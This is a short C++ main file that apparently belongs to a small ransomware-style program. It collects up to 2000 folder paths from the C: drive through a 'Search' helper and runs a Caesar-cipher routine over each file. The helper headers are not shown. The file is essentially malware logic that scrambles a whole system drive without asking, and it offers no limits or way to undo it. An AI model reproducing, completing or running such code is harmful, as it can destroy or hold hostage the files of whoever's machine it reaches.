#include "Search/search.h"
#include "CesarCypher/cesarcypher.h"
#include <vector>
#include <string>
#include <filesystem>


namespace fs = std::filesystem;

int main() {
    std::vector<std::string> cDrive(2000);

    Search::getCDriveFolders(cDrive);

	for(const auto& file : cDrive){
		cesarCypher(file);
	}

	return 0;
}